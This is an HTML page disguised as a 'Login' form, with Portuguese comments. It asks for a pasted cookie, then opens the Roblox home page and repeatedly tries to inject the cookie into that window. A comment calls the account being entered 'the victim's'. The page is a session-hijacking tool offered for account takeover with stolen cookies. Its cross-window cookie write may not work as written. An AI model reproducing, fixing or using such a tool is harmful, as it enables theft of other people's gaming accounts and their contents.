<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            text-align: center;
        }
        .login-container input[type="text"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
            box-sizing: border-box;
        }
        .login-container input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .login-container input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <form id="login-form">
            <input type="text" id="cookie" name="cookie" placeholder="Cole o cookie aqui" required><br>
            <input type="submit" id="submit-btn" value="Enviar">
        </form>
    </div>

    <script>
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault(); // Previne o envio do formulário

            var cookie = document.getElementById('cookie').value;

            // Verifica se o cookie foi enviado
            if (cookie.trim() !== '') {
                // Abre uma nova janela com o redirecionamento para a conta da vítima
                var newWindow = window.open("https://www.roblox.com/home", "_blank");
                
                // Função que aguarda o carregamento da nova janela e injeta o cookie
                function injectCookie() {
                    if (newWindow && newWindow.document && newWindow.document.cookie) {
                        newWindow.document.cookie = cookie; // Injeta o cookie na nova janela
                    } else {
                        setTimeout(injectCookie, 100); // Tenta novamente após 100ms
                    }
                }

                injectCookie(); // Chama a função para injetar o cookie
            } else {
                alert("Por favor, cole o cookie antes de enviar.");
            }
        });
    </script>
</body>
</html>
